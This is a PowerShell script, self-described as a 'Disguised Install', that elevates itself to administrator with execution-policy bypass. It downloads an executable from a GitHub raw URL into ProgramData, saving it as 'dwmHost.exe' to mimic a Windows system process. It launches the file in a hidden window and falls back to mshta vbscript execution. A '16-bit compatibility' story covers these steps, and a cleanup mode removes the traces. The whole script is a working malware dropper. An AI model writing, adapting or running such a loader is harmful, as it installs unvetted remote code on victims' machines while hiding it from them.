# โค้ดที่ปรับปรุงแล้วสำหรับจัดการกรณี 16-bit application
Write-Host "+ Program Installer & Runner (Disguised Install)"
Write-Host "1. Install & Run"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

# Check for Administrator rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Restarting with administrator privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
    exit
}

# Define paths and variables
$InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
$SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe"

# Install & Run Mode - UPDATED FOR 16-BIT ISSUE
if ($choice -eq "1") {
    Write-Host "`nStarting installation..."

    # Create installation folder
    Write-Host "Checking/Creating installation folder in ProgramData..."
    if (-not (Test-Path $InstallPath)) {
        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
        Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
    }

    # Download executable
    Write-Host "Downloading and installing executable..."
    $downloadSuccess = $false
    
    try {
        # Using WebClient for download
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($SexeUrl, $SexeDestination)
        $downloadSuccess = $true
        Write-Host "Download completed successfully!" -ForegroundColor Green
    }
    catch {
        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
        exit
    }

    # Verify file
    if (-not (Test-Path $SexeDestination)) {
        Write-Host "ERROR: Downloaded file not found!" -ForegroundColor Red
        exit
    }

    $fileSize = (Get-Item $SexeDestination).Length
    if ($fileSize -eq 0) {
        Write-Host "ERROR: Downloaded file is empty!" -ForegroundColor Red
        exit
    }

    Write-Host "File verification passed. Size: $fileSize bytes" -ForegroundColor Green

    # Check if file is 16-bit and provide solutions
    Write-Host "Checking file compatibility..."
    
    # Method to detect 16-bit executable (basic check)
    try {
        $fileInfo = Get-Item $SexeDestination
        $fileAge = (Get-Date) - $fileInfo.CreationTime
        
        Write-Host "File created: $($fileInfo.CreationTime)" -ForegroundColor Yellow
        Write-Host "File size: $fileSize bytes" -ForegroundColor Yellow
        
        # If file is suspiciously old or small, it might be 16-bit
        if ($fileSize -lt 200000) {  # Less than 200KB
            Write-Host "WARNING: File appears to be very small - may be incompatible" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Could not analyze file properties" -ForegroundColor Yellow
    }

    # Enhanced execution with 16-bit compatibility handling
    Write-Host "`nAttempting to start program with compatibility modes..."
    $runSuccess = $false
    
    # Method 1: Try with NTVDM emulation (for 16-bit apps)
    try {
        Write-Host "Attempting with compatibility mode..."
        # Using cmd with compatibility flags
        $arguments = "/c `"$SexeDestination`""
        Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -WindowStyle Hidden
        Start-Sleep -Seconds 3
        
        # Check if process is running
        $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
        if ($processes) {
            $runSuccess = $true
            Write-Host "Program started successfully via CMD compatibility." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Compatibility mode execution failed." -ForegroundColor Yellow
    }
    
    # Method 2: Using Windows Compatibility Troubleshooter
    if (-not $runSuccess) {
        try {
            Write-Host "Attempting Windows compatibility troubleshooter method..."
            $compatScript = @"
                try {
                    `$path = '$SexeDestination'
                    `$psi = New-Object System.Diagnostics.ProcessStartInfo
                    `$psi.FileName = 'mshta.exe'
                    `$psi.Arguments = "vbscript:Execute(`"CreateObject(`"`"Shell.Application`"`").ShellExecute(`"`"`$path`"`"`)(window.close)`")"
                    `$psi.UseShellExecute = `$false
                    [System.Diagnostics.Process]::Start(`$psi)
                } catch { }
"@
            Invoke-Expression $compatScript
            Start-Sleep -Seconds 3
            
            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
            if ($processes) {
                $runSuccess = $true
                Write-Host "Program started via compatibility workaround." -ForegroundColor Green
            }
        }
        catch {
            Write-Host "Compatibility workaround failed." -ForegroundColor Yellow
        }
    }
    
    # Method 3: Direct execution with error handling
    if (-not $runSuccess) {
        try {
            Write-Host "Attempting direct execution with error suppression..."
            cmd.exe /c "start `"`" `"$SexeDestination`""
            Start-Sleep -Seconds 3
            
            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
            if ($processes) {
                $runSuccess = $true
                Write-Host "Program started via direct CMD." -ForegroundColor Green
            }
        }
        catch {
            Write-Host "Direct CMD execution failed." -ForegroundColor Yellow
        }
    }

    # Final status and instructions
    if ($runSuccess) {
        Write-Host "`n✅ Program is now running in background." -ForegroundColor Green
        Write-Host "Location: $SexeDestination" -ForegroundColor Cyan
    } else {
        Write-Host "`n⚠️  Program may have compatibility issues:" -ForegroundColor Red
        Write-Host "   - File appears to be 16-bit application" -ForegroundColor Yellow
        Write-Host "   - Windows 64-bit doesn't support 16-bit apps" -ForegroundColor Yellow
        Write-Host "   - File is installed at: $SexeDestination" -ForegroundColor Cyan
        Write-Host "`nYou may need to:" -ForegroundColor White
        Write-Host "   1. Find a 64-bit version of this application" -ForegroundColor White
        Write-Host "   2. Use a virtual machine with 32-bit Windows" -ForegroundColor White
        Write-Host "   3. Contact the developer for updated version" -ForegroundColor White
    }

    Write-Host "`nInstallation process completed." -ForegroundColor Green

# Clean Mode
} elseif ($choice -eq "2") {
    Write-Host "Cleanup installation..."

    # Stop the process if running
    Write-Host "Stopping dwmHost process..."
    try {
        Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue | Stop-Process -Force
        Write-Host "Process stopped." -ForegroundColor Green
    }
    catch {
        Write-Host "No running process found." -ForegroundColor Yellow
    }

    # Remove files and folder
    if (Test-Path $SexeDestination) {
        Remove-Item $SexeDestination -Force
        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
    }
    
    if (Test-Path $InstallPath) {
        Remove-Item $InstallPath -Recurse -Force
        Write-Host "Removed installation folder: $InstallPath" -ForegroundColor Green
    }

    Write-Host "Cleanup completed." -ForegroundColor Green

} else {
    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
}
